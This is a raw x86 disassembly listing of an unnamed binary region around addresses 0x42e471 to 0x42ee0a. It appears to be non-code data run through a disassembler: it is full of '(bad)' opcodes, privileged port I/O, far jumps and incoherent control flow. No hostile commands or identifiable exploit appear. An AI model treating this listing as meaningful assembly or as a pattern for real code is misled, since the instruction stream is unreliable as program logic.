  42e471:	add    BYTE PTR [eax],al
  42e473:	add    dl,ah
  42e475:	mov    ebp,0xe7dfc7dc
  42e47a:	sti    
  42e47b:	mov    ebp,0xe093f290
  42e480:	and    BYTE PTR [esi+ebp*1+0x51],al
  42e484:	inc    eax
  42e485:	out    dx,eax
  42e486:	add    DWORD PTR [eax],eax
  42e488:	add    al,0x1
  42e48a:	add    BYTE PTR [eax],al
  42e48c:	test   BYTE PTR [edi],cl
  42e48e:	pusha  
  42e48f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e490:	add    al,0x31
  42e492:	ror    BYTE PTR [esi],1
  42e494:	dec    eax
  42e495:	fnstcw WORD PTR [eax]
  42e497:	ss mov eax,0xc032e285
  42e49d:	sub    DWORD PTR [eax],edx
  42e49f:	sub    eax,0x665a21a6
  42e4a4:	dec    esi
  42e4a5:	mov    dl,0x34
  42e4a7:	je     0x42e42b
  42e4a9:	dec    edx
  42e4aa:	(bad)  
  42e4ab:	clc    
  42e4ac:	data16 ins BYTE PTR es:[edi],dx
  42e4ae:	dec    eax
  42e4af:	iret   
  42e4b0:	fsubp  st(6),st
  42e4b2:	xlat   BYTE PTR ds:[ebx]
  42e4b3:	stos   DWORD PTR es:[edi],eax
  42e4b4:	(bad)  
  42e4b5:	dec    DWORD PTR [edi]
  42e4b7:	inc    edx
  42e4b8:	sbb    dl,BYTE PTR [edi-0x35]
  42e4bb:	jp     0x42e510
  42e4bd:	fisubr DWORD PTR [ecx-0x55458b0b]
  42e4c3:	repnz mov al,0x16
  42e4c6:	sub    ah,BYTE PTR [edi+eiz*2]
  42e4c9:	lods   eax,DWORD PTR ds:[esi]
  42e4ca:	mov    dl,0x56
  42e4cc:	sbb    DWORD PTR ds:0xc230d427,edx
  42e4d2:	fwait
  42e4d3:	fs ror bh,cl
  42e4d6:	icebp  
  42e4d7:	push   edx
  42e4d8:	out    0x3a,al
  42e4da:	pop    ds
  42e4db:	pushf  
  42e4dc:	daa    
  42e4dd:	adc    BYTE PTR [esi-0x3d],ch
  42e4e0:	jno    0x42e481
  42e4e2:	xor    eax,0x1738f9db
  42e4e7:	xchg   ebx,eax
  42e4e8:	test   DWORD PTR ds:0xb7b4a43c,0x831f75eb
  42e4f2:	xchg   ebx,ecx
  42e4f4:	pushf  
  42e4f5:	in     eax,0x26
  42e4f7:	scas   al,BYTE PTR es:[edi]
  42e4f8:	(bad)  
  42e4f9:	ficomp WORD PTR [ecx+0x58]
  42e4fc:	xchg   ebx,eax
  42e4fd:	aad    0x1c
  42e4ff:	aas    
  42e500:	jle    0x42e4f2
  42e502:	es push 0x16996971
  42e508:	out    0xf0,eax
  42e50a:	ja     0x42e496
  42e50c:	cmp    eax,0xa98de215
  42e511:	jo     0x42e566
  42e513:	push   edx
  42e514:	pop    esp
  42e515:	cmp    edi,edx
  42e517:	leave  
  42e518:	ror    DWORD PTR [eax+0x1211f654],cl
  42e51e:	rcl    ebp,cl
  42e520:	scas   eax,DWORD PTR es:[edi]
  42e521:	cwde   
  42e522:	adc    ebp,esp
  42e524:	mov    esi,0x1ae122af
  42e529:	ja     0x42e4ef
  42e52b:	ins    BYTE PTR es:[edi],dx
  42e52c:	scas   al,BYTE PTR es:[edi]
  42e52d:	retf   0x2610
  42e530:	pop    ecx
  42e531:	mov    edi,0xf7e01aaf
  42e536:	jmp    0x42e507
  42e538:	inc    eax
  42e539:	shl    BYTE PTR ss:[eax-0x3],0x5e
  42e53e:	sub    eax,0xebbb880c
  42e543:	push   ss
  42e544:	call   0xaac2:0x222b5a4f
  42e54b:	(bad)  
  42e54c:	fld    QWORD PTR [edx+0x62]
  42e54f:	(bad)  
  42e551:	add    al,0x49
  42e553:	pushf  
  42e554:	jle    0x42e543
  42e556:	retf   0xd2f
  42e559:	sahf   
  42e55a:	push   esp
  42e55b:	push   es
  42e55c:	mov    BYTE PTR [eax],0xf3
  42e55f:	loop   0x42e5be
  42e561:	xor    al,0x3
  42e563:	lods   eax,DWORD PTR es:[esi]
  42e565:	mov    ds,WORD PTR [esi+0x47]
  42e568:	cmp    BYTE PTR ds:0xd57500e6,dh
  42e56e:	into   
  42e56f:	push   esi
  42e570:	fcomi  st,st(2)
  42e572:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e573:	daa    
  42e574:	mov    al,ds:0x90348718
  42e579:	jge    0x42e567
  42e57b:	or     BYTE PTR [eax+0x65],0x71
  42e57f:	lock xor al,0xe0
  42e582:	push   ebp
  42e583:	xchg   ebp,eax
  42e584:	mov    ebx,0x81a56c31
  42e589:	scas   eax,DWORD PTR es:[edi]
  42e58a:	aas    
  42e58b:	inc    ebp
  42e58c:	in     al,0x16
  42e58e:	xchg   esp,eax
  42e58f:	mov    ah,0x0
	...
  42e5f1:	add    BYTE PTR [eax],al
  42e5f3:	add    BYTE PTR [ebp+0x38],dl
  42e5f6:	into   
  42e5f7:	adc    bh,ch
  42e5f9:	neg    bh
  42e5fb:	jge    0x42e58f
  42e5fd:	xchg   ebp,eax
  42e5fe:	jns    0x42e631
  42e600:	dec    ebp
  42e601:	sub    al,0xd
  42e603:	mov    ch,0x44
  42e605:	lock add DWORD PTR [eax],eax
  42e608:	add    al,0x1
  42e60a:	add    BYTE PTR [eax],al
  42e60c:	rol    BYTE PTR [edi+0x752fa95e],1
  42e612:	stc    
  42e613:	sbb    ch,ch
  42e615:	fmul   QWORD PTR [edi]
  42e617:	jns    0x42e685
  42e619:	leave  
  42e61a:	cwde   
  42e61b:	mov    bl,0x47
  42e61d:	fs sti 
  42e61f:	int3   
  42e620:	adc    al,bh
  42e622:	adc    al,0xf1
  42e624:	test   cl,dl
  42e626:	jo     0x42e69b
  42e628:	push   es
  42e629:	or     DWORD PTR [edi+0x62],eax
  42e62c:	mov    al,ds:0xa17f3b17
  42e631:	jmp    0x14b:0x6fa7ec4f
  42e638:	ret    
  42e639:	xor    al,0xca
  42e63b:	inc    ecx
  42e63c:	test   dh,bh
  42e63e:	imul   ebx,DWORD PTR [ecx+0x4021a805],0xffffffb5
  42e645:	aam    0xd4
  42e647:	fiadd  WORD PTR [edi-0x5d236c9]
  42e64d:	add    BYTE PTR [ebp-0x70],al
  42e650:	mov    DWORD PTR [esi+0x32398248],ebp
  42e656:	cmp    DWORD PTR [ebx-0x5cd8c6ef],0x4727ee35
  42e660:	add    eax,0x78785d31
  42e665:	adc    eax,0xa93dc4df
  42e66a:	push   ebp
  42e66b:	bnd jmp 0xdfc59be5
  42e671:	jg     0x42e6b6
  42e673:	adc    ah,BYTE PTR [edi]
  42e675:	mov    edi,0x31e80921
  42e67a:	push   esi
  42e67b:	jmp    0x7f847dd9
  42e680:	xchg   edx,eax
  42e681:	outs   dx,BYTE PTR ds:[esi]
  42e682:	jge    0x42e637
  42e684:	dec    ebx
  42e685:	mov    esp,DWORD PTR [edx-0x652ee259]
  42e68b:	loope  0x42e701
  42e68d:	inc    edi
  42e68e:	mov    DWORD PTR [edx-0x3d],eax
  42e691:	xor    ebp,DWORD PTR [ebp-0x78]
  42e694:	mov    es:0x157b121a,eax
  42e69a:	and    bh,BYTE PTR [edx]
  42e69c:	pop    edi
  42e69d:	jmp    0x83f:0x9b33a7f4
  42e6a4:	jne    0x42e694
  42e6a6:	xor    DWORD PTR [ebx-0xf5a38aa],0xc975cda4
  42e6b0:	fistp  QWORD PTR [esi+0x165d5c2e]
  42e6b6:	in     eax,dx
  42e6b7:	loope  0x42e6b0
  42e6b9:	fimul  DWORD PTR [edi]
  42e6bb:	mov    al,0xfa
  42e6bd:	inc    ebp
  42e6be:	fild   QWORD PTR [esi-0x71626b4]
  42e6c4:	adc    BYTE PTR [ebx+0x26],bl
  42e6c7:	cli    
  42e6c8:	add    BYTE PTR [edx-0x38d2644d],ah
  42e6ce:	call   0xd1266dc5
  42e6d3:	mov    al,ds:0x3f66f29e
  42e6d8:	jno    0x42e754
  42e6da:	pop    ebp
  42e6db:	call   0xa735:0x63fb967b
  42e6e2:	std    
  42e6e3:	push   cs
  42e6e4:	mov    ds:0x924ab7fd,eax
  42e6e9:	lock out dx,eax
  42e6eb:	dec    ebp
  42e6ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e6ed:	mov    dl,0xd2
  42e6ef:	out    dx,eax
  42e6f0:	test   al,0xbe
  42e6f2:	aaa    
  42e6f3:	lahf   
  42e6f4:	xchg   edx,eax
  42e6f5:	shl    BYTE PTR [edx+0x3],0xac
  42e6f9:	in     al,0x59
  42e6fb:	jle    0x42e69b
  42e6fd:	add    al,0x5d
  42e700:	jno    0x42e68c
  42e702:	neg    BYTE PTR [esi]
  42e704:	and    cl,BYTE PTR [ecx+0x61b57005]
  42e70a:	test   al,0x73
  42e70c:	outs   dx,DWORD PTR ds:[esi]
  42e70d:	push   ebp
  42e70e:	fbld   TBYTE PTR [edx]
	...
  42e774:	pop    edx
  42e775:	cmp    DWORD PTR [esi+0x2d],ecx
  42e778:	outs   dx,DWORD PTR ds:[esi]
  42e779:	jg     0x42e7f6
  42e77b:	jg     0x42e7e1
  42e77d:	sub    BYTE PTR [esi],cl
  42e77f:	ficom  DWORD PTR [edx]
  42e781:	retf   0xee8c
  42e784:	dec    eax
  42e785:	icebp  
  42e786:	add    DWORD PTR [eax],eax
  42e788:	add    al,0x1
  42e78a:	add    BYTE PTR [eax],al
  42e78c:	jge    0x42e760
  42e78e:	sub    bh,BYTE PTR [ebp-0x4df6e521]
  42e794:	int    0x8d
  42e796:	sbb    edi,DWORD PTR [ecx]
  42e798:	and    bh,BYTE PTR [edi-0x16fe83dd]
  42e79e:	fst    QWORD PTR [edi+0x5c]
  42e7a1:	int    0x85
  42e7a3:	mov    ebx,0xe03a9138
  42e7a8:	(bad)  
  42e7a9:	ror    BYTE PTR [esi],1
  42e7ab:	out    dx,eax
  42e7ac:	add    DWORD PTR [ecx],esi
  42e7ae:	mov    ebx,0xef90caa4
  42e7b3:	xchg   edi,eax
  42e7b4:	mov    ch,0xbd
  42e7b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e7b7:	add    DWORD PTR [eax-0x29],ecx
  42e7ba:	xor    ch,BYTE PTR [eax+0x45]
  42e7bd:	int    0x11
  42e7bf:	xor    edx,eax
  42e7c1:	cmp    bl,bh
  42e7c3:	adc    esi,ebx
  42e7c5:	std    
  42e7c6:	jno    0x42e78e
  42e7c8:	push   ebx
  42e7c9:	adc    BYTE PTR [ecx],0x7f
  42e7cc:	lock and edi,eax
  42e7cf:	test   al,0x76
  42e7d1:	jle    0x42e84c
  42e7d3:	mov    ah,0xce
  42e7d5:	retf   
  42e7d6:	test   DWORD PTR [ebp+0x5],ebp
  42e7d9:	fsub   DWORD PTR [ebp-0x18]
  42e7dc:	inc    ecx
  42e7dd:	push   ecx
  42e7de:	sbb    DWORD PTR [eax+edx*8],edx
  42e7e1:	sbb    edi,DWORD PTR [edi+0x6]
  42e7e4:	sub    al,0xa5
  42e7e6:	mov    al,0x58
  42e7e8:	jmp    0x4b4f9c4
  42e7ed:	push   0x5415374e
  42e7f2:	push   esp
  42e7f3:	shr    DWORD PTR [ecx-0x675ea572],1
  42e7f9:	(bad)  
  42e7fa:	div    DWORD PTR ds:0xd4a77d5e
  42e800:	cdq    
  42e801:	std    
  42e802:	test   al,0x34
  42e804:	mov    ecx,0xf635e7a1
  42e809:	int3   
  42e80a:	or     BYTE PTR [esi+0x3403f19],dl
  42e810:	push   0xec9c1596
  42e815:	pop    esi
  42e816:	adc    ch,al
  42e818:	aam    0x9d
  42e81a:	mov    edx,0xa8d2274f
  42e81f:	ret    0x1414
  42e822:	or     eax,0x8c8ed473
  42e827:	sub    eax,0x96442108
  42e82c:	mov    ah,0x29
  42e82e:	dec    esi
  42e82f:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  42e831:	mov    esp,0x590f754a
  42e836:	iret   
  42e837:	inc    BYTE PTR [ebp+0x239de20a]
  42e83d:	call   0x135b779c
  42e842:	and    al,0xeb
  42e844:	adc    bl,BYTE PTR [ecx+0x1520362a]
  42e84a:	jp     0x42e80b
  42e84c:	add    eax,0x7fdde8c5
  42e851:	sub    eax,0x881d29fe
  42e856:	aad    0x26
  42e858:	ret    
  42e859:	jne    0x42e83e
  42e85b:	or     ebp,DWORD PTR [edi]
  42e85d:	data16 or BYTE PTR [edx],ah
  42e860:	xor    ch,BYTE PTR ds:[eax]
  42e863:	mov    cl,0x26
  42e865:	xchg   ebx,eax
  42e866:	das    
  42e867:	sub    DWORD PTR [edx+0x1c],edi
  42e86a:	(bad)  
  42e86c:	xchg   BYTE PTR gs:[edi+esi*2+0x3b5cc57d],al
  42e874:	test   al,0x74
  42e876:	ds sbb eax,0x33234bc0
  42e87c:	fild   WORD PTR [ebx+0x2ab6bf49]
  42e882:	pushf  
  42e883:	push   esi
  42e884:	shl    BYTE PTR [ecx],cl
  42e886:	cdq    
  42e887:	jmp    0x42e898
  42e889:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e88a:	jno    0x42e8e9
  42e88c:	daa    
  42e88d:	pop    edi
  42e88e:	adc    al,0xac
	...
  42e8f4:	ret    
  42e8f5:	ja     0x42e957
  42e8f7:	and    al,0xf4
  42e8f9:	aaa    
  42e8fa:	(bad)  
  42e8fb:	div    DWORD PTR [ecx-0x48dc07d5]
  42e901:	jl     0x42e95b
  42e903:	xchg   edx,eax
  42e904:	dec    esp
  42e905:	repnz add DWORD PTR [eax],eax
  42e908:	add    al,0x1
  42e90a:	add    BYTE PTR [eax],al
  42e90c:	imul   ebx,DWORD PTR [edx],0x72
  42e90f:	pop    ss
  42e910:	leave  
  42e911:	xor    al,0x12
  42e913:	out    dx,eax
  42e914:	sub    al,0x9b
  42e916:	or     al,0x14
  42e918:	clc    
  42e919:	ja     0x42e96f
  42e91b:	sub    al,0x2a
  42e91d:	mov    dl,0x84
  42e91f:	data16 ins BYTE PTR es:[edi],dx
  42e921:	lds    eax,FWORD PTR [edi+0x3a]
  42e924:	xchg   edx,eax
  42e925:	loop   0x42e8cf
  42e927:	mov    ebp,0x95d8a380
  42e92c:	out    dx,eax
  42e92d:	lds    edi,FWORD PTR [esi]
  42e92f:	adc    bh,cl
  42e931:	ret    0xa934
  42e934:	das    
  42e935:	inc    ebx
  42e936:	xchg   ebp,eax
  42e937:	fist   DWORD PTR [esp+ebp*8-0x80]
  42e93b:	push   ecx
  42e93c:	push   0x43dd9881
  42e941:	dec    ebp
  42e942:	es push edi
  42e944:	not    ch
  42e946:	scas   al,BYTE PTR es:[edi]
  42e947:	adc    edx,edx
  42e949:	test   DWORD PTR [ecx],ecx
  42e94b:	int    0x1e
  42e94d:	xlat   BYTE PTR ds:[bx]
  42e94f:	mov    esi,0x3013b485
  42e954:	push   es
  42e955:	or     eax,0xe464e08a
  42e95a:	in     al,dx
  42e95b:	mov    bl,0x79
  42e95d:	std    
  42e95e:	lds    eax,FWORD PTR ds:[esi+0x5ea95382]
  42e965:	test   eax,0xe29c6ef
  42e96a:	add    al,0xa6
  42e96c:	std    
  42e96d:	mov    ah,0x22
  42e96f:	and    BYTE PTR [ebp-0x3c45e425],dh
  42e975:	pop    ebp
  42e976:	dec    ebx
  42e977:	or     eax,0x38582772
  42e97c:	jbe    0x42e970
  42e97e:	jp     0x42e90c
  42e980:	mov    ecx,0xf403eb16
  42e985:	out    dx,eax
  42e986:	sub    al,0xbe
  42e988:	pop    ds
  42e989:	rcl    DWORD PTR [ebp-0x61c882dd],0x1f
  42e990:	(bad)  
  42e991:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e992:	mov    cl,0x92
  42e994:	inc    esi
  42e995:	and    dl,bl
  42e997:	retf   0x3e5f
  42e99a:	or     ebp,esp
  42e99c:	pop    es
  42e99d:	sbb    cx,sp
  42e9a0:	clc    
  42e9a1:	pop    ecx
  42e9a2:	rcl    DWORD PTR [ebp+0x301de96],cl
  42e9a8:	and    ecx,ecx
  42e9aa:	sbb    BYTE PTR [edi-0x1b],dh
  42e9ad:	cs lock std 
  42e9b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e9b1:	lods   eax,DWORD PTR ds:[esi]
  42e9b2:	js     0x42e93b
  42e9b4:	dec    edx
  42e9b5:	fcmovb st,st(1)
  42e9b7:	cmp    dh,al
  42e9b9:	imul   esp,edx,0x2e
  42e9bc:	cdq    
  42e9bd:	fbld   TBYTE PTR [eax-0x25e0e631]
  42e9c3:	stos   DWORD PTR es:[edi],eax
  42e9c4:	mov    ch,0x87
  42e9c6:	shr    BYTE PTR [ecx+eax*1+0x3bfb3c0d],1
  42e9cd:	xor    ah,dl
  42e9cf:	cs push ss
  42e9d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e9d2:	push   edi
  42e9d3:	mov    cl,0x97
  42e9d5:	pop    ebp
  42e9d6:	pushf  
  42e9d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e9d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e9d9:	cld    
  42e9da:	loop   0x42e9a4
  42e9dc:	add    al,0x19
  42e9de:	(bad)  
  42e9df:	mov    DWORD PTR [ebx+0x68ae5207],esi
  42e9e5:	je     0x42e982
  42e9e7:	adc    BYTE PTR [eax+0x70],0x4d
  42e9eb:	jne    0x42e9ce
  42e9ed:	cmp    DWORD PTR [edx-0x8cda7b0],edx
  42e9f3:	das    
  42e9f4:	ss add al,0x24
  42e9f7:	xor    eax,0x56a8d4d
  42e9fc:	pop    edx
  42e9fd:	test   eax,0xc9eb51ab
  42ea02:	shl    BYTE PTR [ebx],cl
  42ea04:	dec    esp
  42ea05:	mov    ds:0x69e61305,eax
  42ea0a:	jne    0x42e9e8
  42ea0c:	and    edx,DWORD PTR [ebx+0x38]
  42ea0f:	dec    ebx
	...
  42ea74:	in     eax,0xba
  42ea76:	xchg   edx,eax
  42ea77:	jecxz  0x42ea58
  42ea79:	jmp    0x42ea70
  42ea7b:	mov    esi,0x66dc160c
  42ea80:	push   ebp
  42ea81:	loop   0x42ea43
  42ea83:	loop   0x42ead5
  42ea85:	repz add DWORD PTR [eax],eax
  42ea88:	add    al,0x1
  42ea8a:	add    BYTE PTR [eax],al
  42ea8c:	and    al,BYTE PTR [eax-0x70]
  42ea8f:	cwde   
  42ea90:	mov    edi,eax
  42ea92:	add    ecx,esi
  42ea94:	pusha  
  42ea95:	in     al,dx
  42ea96:	fnstenv [edi+edi*1+0x36]
  42ea9a:	xchg   ecx,eax
  42ea9b:	mov    eax,cs
  42ea9d:	cmp    esi,DWORD PTR [ebx+eiz*1-0x24]
  42eaa1:	ds xchg ecx,eax
  42eaa3:	push   ecx
  42eaa4:	sahf   
  42eaa5:	aaa    
  42eaa6:	(bad)  
  42eaa7:	sub    edi,DWORD PTR [edi-0x7b]
  42eaaa:	sti    
  42eaab:	ret    
  42eaac:	xchg   al,cl
  42eaae:	pop    ebp
  42eaaf:	mov    bl,ah
  42eab1:	sub    BYTE PTR [edx+edx*4-0x3b409739],bh
  42eab8:	and    eax,0x6315cbe5
  42eabd:	popa   
  42eabe:	shr    DWORD PTR [edx-0x54],cl
  42eac1:	call   0x8ff4:0x634fac77
  42eac8:	iret   
  42eac9:	xor    al,0x8f
  42eacb:	pop    esi
  42eacc:	dec    ecx
  42eacd:	pop    eax
  42eace:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eacf:	or     BYTE PTR [ebp-0x315e9803],ah
  42ead5:	jmp    0x42eaba
  42ead7:	jecxz  0x42eadd
  42ead9:	iret   
  42eada:	push   eax
  42eadb:	mov    esi,0x1a19927b
  42eae0:	jecxz  0x42ea7b
  42eae2:	mov    ah,0x56
  42eae4:	lods   eax,DWORD PTR ds:[esi]
  42eae5:	scas   al,BYTE PTR es:[edi]
  42eae6:	cmp    esi,ebp
  42eae8:	pop    ss
  42eae9:	mov    al,0x1b
  42eaeb:	dec    edx
  42eaec:	pop    edx
  42eaed:	(bad)  
  42eaee:	mov    esp,DWORD PTR [esp+eax*8-0x6b76f811]
  42eaf5:	fdiv   DWORD PTR [eax+eiz*1-0x59]
  42eaf9:	mov    ch,0xe
  42eafb:	bound  edx,QWORD PTR [ebx+0x6dc54094]
  42eb01:	stc    
  42eb02:	pop    es
  42eb03:	add    al,0x63
  42eb05:	sar    DWORD PTR [eax-0x5f],cl
  42eb08:	cdq    
  42eb09:	mov    esi,0xe3832ca9
  42eb0e:	in     eax,dx
  42eb0f:	enter  0x7a17,0x6c
  42eb13:	xlat   BYTE PTR ds:[ebx]
  42eb14:	std    
  42eb15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eb16:	in     al,dx
  42eb17:	jne    0x42eb30
  42eb19:	stos   BYTE PTR es:[edi],al
  42eb1a:	aaa    
  42eb1b:	in     al,dx
  42eb1c:	mov    BYTE PTR [eax+eiz*4+0xe],bl
  42eb20:	fs cmp ebx,esi
  42eb23:	imul   esp,DWORD PTR [ebp+0x60bb831c],0x9f7b5808
  42eb2d:	jp     0x42eb36
  42eb2f:	stos   BYTE PTR es:[edi],al
  42eb30:	stos   BYTE PTR es:[edi],al
  42eb31:	inc    esi
  42eb32:	retf   
  42eb33:	arpl   si,sp
  42eb35:	cmc    
  42eb36:	inc    esp
  42eb38:	outs   dx,DWORD PTR ds:[esi]
  42eb39:	call   0xd4cc:0x71831239
  42eb40:	xlat   BYTE PTR ds:[ebx]
  42eb41:	idiv   BYTE PTR [eax+edx*2-0x1fba5b09]
  42eb48:	adc    DWORD PTR [ebx+0x75],edi
  42eb4b:	int3   
  42eb4c:	and    DWORD PTR [edi+0x1c9c39af],esp
  42eb52:	adc    ecx,DWORD PTR [eax+0x7860c1fd]
  42eb58:	add    dh,BYTE PTR [eax+edi*2+0xcea1ac2]
  42eb5f:	stos   BYTE PTR es:[edi],al
  42eb60:	ret    
  42eb61:	jns    0x42eb66
  42eb63:	cwde   
  42eb64:	push   ecx
  42eb65:	and    eax,0x1fbdff78
  42eb6a:	pop    esp
  42eb6b:	adc    DWORD PTR [esi-0x1e],esi
  42eb6e:	fisttp QWORD PTR ss:[ecx]
  42eb71:	enter  0xce1,0x6d
  42eb75:	bound  esi,QWORD PTR es:0x91ef2be7
  42eb7c:	jmp    0xf32b:0xa3e8c132
  42eb83:	nop
  42eb84:	or     al,0xb3
  42eb86:	test   esi,esi
  42eb88:	lock cs es test edi,esi
  42eb8d:	sti    
  42eb8e:	xor    BYTE PTR [esi],bh
	...
  42ebf4:	jle    0x42ec37
  42ebf6:	jne    0xfc41bb3b
  42ebfc:	pusha  
  42ebfd:	popf   
  42ebfe:	pop    ecx
  42ebff:	or     DWORD PTR [eax+0x54165471],0x40001f4
  42ec09:	add    DWORD PTR [eax],eax
  42ec0b:	add    BYTE PTR [edi+0x70],cl
  42ec0e:	dec    esp
  42ec0f:	or     DWORD PTR [eax],edx
  42ec11:	sbb    bl,BYTE PTR [edi-0x39]
  42ec14:	cmp    DWORD PTR [ebp-0x4293be79],ebp
  42ec1a:	mov    dh,al
  42ec1c:	and    al,0x76
  42ec1e:	int    0x38
  42ec20:	sar    DWORD PTR [eax+0x39],1
  42ec23:	loop   0x42ec2d
  42ec25:	ds pushf 
  42ec27:	adc    edx,edi
  42ec29:	or     al,0xf0
  42ec2b:	in     al,0x11
  42ec2d:	xlat   BYTE PTR ds:[ebx]
  42ec2e:	repnz sbb BYTE PTR [esi+0x7e],dh
  42ec32:	or     BYTE PTR [edi],cl
  42ec34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ec35:	mov    esi,0xd5e84b6a
  42ec3a:	and    DWORD PTR [edi+0x366c3662],eax
  42ec40:	adc    BYTE PTR [eax+0x6cb72f92],0xc3
  42ec47:	aas    
  42ec48:	xor    DWORD PTR [ecx],0xca696860
  42ec4e:	mov    eax,0xca7d1016
  42ec53:	imul   edi,DWORD PTR [ecx],0xffffff87
  42ec56:	jbe    0x42ebfd
  42ec58:	inc    eax
  42ec59:	xchg   ecx,eax
  42ec5a:	data16 (bad) 
  42ec5c:	in     al,0xf5
  42ec5e:	pop    edi
  42ec5f:	xchg   BYTE PTR [eax-0x20],bl
  42ec62:	pop    ss
  42ec63:	and    al,0x3e
  42ec65:	cmp    ch,BYTE PTR [ecx+0x6b]
  42ec68:	aad    0x91
  42ec6a:	sar    DWORD PTR [esi+0xc],cl
  42ec6d:	sbb    dl,BYTE PTR [eax]
  42ec6f:	inc    ebp
  42ec70:	dec    esp
  42ec71:	pop    ecx
  42ec72:	sbb    BYTE PTR [edi+ebx*4+0x10948cb0],0x49
  42ec7a:	out    dx,al
  42ec7b:	jnp    0x42ecef
  42ec7d:	mov    ebx,0x90edc2aa
  42ec82:	out    0x3b,eax
  42ec84:	test   BYTE PTR [eax-0x5f3f707a],ah
  42ec8a:	retf   
  42ec8b:	cmp    esp,DWORD PTR [edx+esi*4-0x31baff0e]
  42ec92:	call   0x1c95:0xbe40d42c
  42ec99:	sahf   
  42ec9a:	ins    BYTE PTR es:[edi],dx
  42ec9b:	sahf   
  42ec9c:	sub    edi,ecx
  42ec9e:	mov    BYTE PTR [eax-0x2af6f3b7],ch
  42eca4:	les    ecx,FWORD PTR [edx-0x53]
  42eca7:	xor    ebx,eax
  42eca9:	adc    eax,0x24e1ce6
  42ecae:	push   0xffffffc8
  42ecb0:	(bad)  
  42ecb1:	sub    esp,edx
  42ecb3:	stos   DWORD PTR es:[edi],eax
  42ecb4:	push   eax
  42ecb5:	jns    0x42ec5f
  42ecb7:	dec    ecx
  42ecb8:	jbe    0x42ec5b
  42ecba:	(bad)  
  42ecbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ecbc:	or     ah,bl
  42ecbe:	fdivrp st(7),st
  42ecc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ecc1:	rol    DWORD PTR [esp+edx*2+0x787c8be9],cl
  42ecc8:	mov    dl,0x1d
  42ecca:	int3   
  42eccb:	ins    DWORD PTR es:[edi],dx
  42eccc:	cmp    BYTE PTR [ecx+edx*8],ah
  42eccf:	jne    0x42ec9a
  42ecd1:	jbe    0x42ecbc
  42ecd3:	or     BYTE PTR [esi+0x5a97098d],dl
  42ecd9:	sub    DWORD PTR [edi+0x6e],0xfffb9556
  42ece0:	pushf  
  42ece1:	push   ds
  42ece2:	daa    
  42ece3:	mov    edi,0x90db511
  42ece8:	clc    
  42ece9:	cli    
  42ecea:	rcr    dl,0xc4
  42eced:	addr16 popf 
  42ecef:	jl     0x42ec7f
  42ecf1:	cmp    eax,0xfc70d3a
  42ecf6:	inc    ecx
  42ecf7:	jae    0x42ec8e
  42ecf9:	je     0x42ecd6
  42ecfb:	(bad)  
  42ecfc:	jg     0x42ed03
  42ecfe:	out    dx,al
  42ecff:	pusha  
  42ed00:	and    DWORD PTR [eax+ebp*8-0x44e1d49f],0x48
  42ed08:	out    dx,al
  42ed09:	stc    
  42ed0a:	mov    al,0x7
  42ed0c:	mov    ecx,0xf532c4
	...
  42ed71:	add    BYTE PTR [eax],al
  42ed73:	add    BYTE PTR [edx],ch
  42ed75:	imul   BYTE PTR [edi+0x7fd9ffd8]
  42ed7b:	mul    bl
  42ed7d:	xor    al,BYTE PTR [ebp-0x643b745e]
  42ed83:	sub    DWORD PTR [eax-0xb],ebx
  42ed86:	add    DWORD PTR [eax],eax
  42ed88:	add    al,0x1
  42ed8a:	add    BYTE PTR [eax],al
  42ed8c:	mov    edi,0x5b36887
  42ed91:	in     eax,dx
  42ed92:	pop    esi
  42ed93:	mov    WORD PTR [edx+0x64],fs
  42ed96:	rcr    bl,cl
  42ed98:	in     eax,0x39
  42ed9a:	push   ebx
  42ed9b:	add    BYTE PTR [edx],bh
  42ed9d:	dec    ebx
  42ed9e:	xor    cl,BYTE PTR [edi-0x7e]
  42eda1:	je     0x42eddd
  42eda3:	pop    ebx
  42eda4:	aas    
  42eda5:	adc    ch,BYTE PTR [eax+0x3e]
  42eda8:	test   al,0xe3
  42edaa:	sub    al,0x6a
  42edac:	arpl   WORD PTR [esi],dx
  42edae:	call   FWORD PTR [ebp+0x63]
  42edb1:	pop    ss
  42edb2:	(bad)  
  42edb3:	xlat   BYTE PTR ds:[ebx]
  42edb4:	inc    edi
  42edb5:	inc    edx
  42edb6:	inc    edi
  42edb7:	add    DWORD PTR ds:0x27dd56a9,edi
  42edbd:	jmp    0xc8c1fd9b
  42edc2:	jns    0x42edec
  42edc4:	fcom   DWORD PTR [eax+0x6b]
  42edc7:	mov    ebx,0x5aeba0a6
  42edcc:	fchs   
  42edce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42edcf:	jg     0x42edac
  42edd1:	(bad)  
  42edd2:	ins    BYTE PTR es:[edi],dx
  42edd3:	xor    eax,0x71c05701
  42edd8:	push   ss
  42edd9:	imul   BYTE PTR [esi-0x4695a32b]
  42eddf:	dec    eax
  42ede0:	or     eax,DWORD PTR [ebx-0x2b]
  42ede3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ede4:	inc    ebx
  42ede5:	ss mov ch,0xc3
  42ede8:	lock clc 
  42edea:	jne    0x42ee4e
  42edec:	pop    ebp
  42eded:	or     DWORD PTR [ebx+0x55703362],0x84c5ca01
  42edf7:	int3   
  42edf8:	lahf   
  42edf9:	inc    ebp
  42edfa:	stos   BYTE PTR es:[edi],al
  42edfb:	out    dx,eax
  42edfc:	mov    ebx,0x9bcfb7e0
  42ee01:	mov    esp,0x45a6d0c7
  42ee06:	out    dx,al
  42ee07:	imul   eax,DWORD PTR [ecx],0x64
  42ee0a:	lods   al,BYTE PTR ds:[esi]
